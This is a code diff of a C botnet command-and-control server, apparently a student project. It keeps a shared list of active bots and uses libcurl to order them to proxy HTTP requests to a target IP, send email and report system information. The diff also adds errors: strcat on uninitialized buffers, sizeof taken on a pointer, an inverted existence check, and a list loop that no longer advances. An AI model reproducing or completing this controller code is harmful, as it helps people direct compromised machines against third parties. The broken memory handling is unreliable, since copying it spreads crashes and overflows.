@@ -23,7 +23,7 @@
 
 // BOT -> Critical section
 
-active_bots *botnet = NULL; // Shared memory!
+active_bots *botnet = NULL;
 sem_t r, w;
 int readcount, ret, sock_fd;
 struct MHD_Daemon *mhd_daemon;
@@ -80,7 +80,7 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
 
     return ret;
 }
-// ! ########################################################### MAIN ######################################################################################
+// ! MAIN
 int main(int argc, char const *argv[])
 {
 
@@ -117,7 +117,7 @@ int main(int argc, char const *argv[])
 
     return 0;
 }
-// ! ########################################################### PARENT ######################################################################################
+
 void parent(int pid)
 {
     while (1)
@@ -155,7 +155,6 @@ void parent(int pid)
 
             exit(EXIT_SUCCESS);
         }
-        else if (strcmp(command,"\n") == 0) {}
         // maybe just one or multiple | statements
 
         else if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, EMAIL) == 0 | strcmp(command, SYS_INFO) == 0)
@@ -190,7 +189,7 @@ void parent(int pid)
         }
     }
 }
-// ! ########################################################### CHILD ######################################################################################
+
 void child()
 {
 
@@ -224,7 +223,7 @@ void sendCommand(char *command, int bot_id)
 
         CURLcode res;
 
-        char *url;
+        char * url; // TODO this should be a malloc with size of parameters, (8 + ? + 10)
 
         char bot_ip[INET_ADDRSTRLEN];
         char target_ip[INET_ADDRSTRLEN];
@@ -244,35 +243,33 @@ void sendCommand(char *command, int bot_id)
         }
 
         printf("Submit target's ip in dot decimal notation: \n");
-        fgets(target_ip, sizeof(target_ip), stdin);
+        fgets(target_ip, INET_ADDRSTRLEN, stdin);
 
-        updateBotInfo(bot_id, 16, command);
+        updateBotInfo(bot_id, target_ip, command);
 
         // * BUILDING REQUEST
-        url = (char *)malloc(sizeof(target_ip) + sizeof(PROTOCOL));
+        url = (char*) malloc(sizeof(bot_ip)+sizeof(PROTOCOL));
 
-        strcpy(url, PROTOCOL);
-        strcat(url, target_ip);
-
+        strcat(url, PROTOCOL);
+        strcat(url, bot_ip);
         curl_easy_setopt(curl, CURLOPT_PORT, bot_port);
 
+        // printf("%s \n", url);
         //! for each command you need to update bot info about action and target
         if (strcmp(command, HTTP_REQ) == 0)
         {
             char request[MAX_REQ_SIZE];
 
             printf("Insert request to proxy : ");
-            scanf("%s", request);
+            fgets(request,MAX_REQ_SIZE,stdin);
 
-            char *new_url = (char *)malloc(sizeof(url) + sizeof(request) + sizeof(HTTP_REQ_ENDPOINT));
-            memcpy(new_url, url, sizeof(url));
 
-            strcat(new_url, HTTP_REQ_ENDPOINT);
 
-            strcat(new_url, request);
+            url = realloc(url,sizeof(url) + sizeof(request) + sizeof(HTTP_REQ_ENDPOINT));
+            strcat(url, HTTP_REQ_ENDPOINT);
+            strcat(url, request);
 
-            printf("Sending request:  %s to bot...\n", new_url);
-            free(new_url);
+            printf("Sending command to bot...\n");
         }
 
         if (strcmp(command, EMAIL) == 0)
@@ -281,7 +278,7 @@ void sendCommand(char *command, int bot_id)
 
             strcat(url, "/email");
 
-            // TODO email batch
+            // TODO add request body
         }
         if (strcmp(command, SYS_INFO) == 0)
         {
@@ -420,7 +417,7 @@ int botExists(int bot_id)
         {
             if (bot->bot_id == bot_id)
             {
-                res = 1;
+                res = -1;
                 break;
             }
 
@@ -673,11 +670,10 @@ void updateBotInfo(int bot_id, char *target_ip, char *command)
 
             inet_pton(AF_INET, target_ip, &(bot->target_address));
 
-            strcpy(bot->action, command);
+            strcpy(bot->action,command);
 
             break;
         }
-        bot = bot->next;
     }
 
     ret = sem_post(&w);
